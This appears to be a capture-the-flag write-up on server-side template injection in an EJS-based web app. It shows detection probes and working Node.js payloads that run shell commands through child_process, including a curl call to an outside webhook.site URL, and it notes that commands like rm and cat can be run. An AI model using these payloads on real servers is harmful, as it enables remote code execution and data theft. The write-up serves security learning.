## Solution SSTI

Let's go to /page-account and check account details

![Alt text](img1.JPG)

As you see, a button contain firstname and lastname of user.

Server Side Template Injection (SSTI) is a web exploit (server side exploit) which takes advantage of an insecure implementation of a template engine.

### Detect

I will check by payload: `${{<%[%'"}}%\` (fuzzing the template)

![Alt text](img2.JPG)

And save changes. This's a web response. So sever execute my payload and throw error because payload `${{<%[%'"}}%\` is synthesized by many different templates.

![Alt text](image.png)

In order to check it exactly, I will check payload `${7*7}`, `<%- 7*7 %>`, `{{7*7}}`,...

${7*7}

![Alt text](image-1.png)

<%- 7*7 %>
![Alt text](img3.JPG)

![Alt text](img4.JPG)

So, this web has SSTI bug and using EJS template.

Firstly, I use the payload `global.process.mainModule.require('child_process').execSync('curl https://webhook.site/a00c32ab-e5c5-4d2f-baf6-2f6d6ec5e343')`

And error occurred

![Alt text](image-2.png)

Server maybe filter some word?

I will use another payload: `<%- global.process.mainModule.require('child_process').spawn('curl https://webhook.site/a00c32ab-e5c5-4d2f-baf6-2f6d6ec5e343', [], { stdio: 'inherit', shell: true }) %>`

and this is result

![Alt text](image-3.png)

![Alt text](image-4.png)

So you can excute any command like ls, rm, cat,...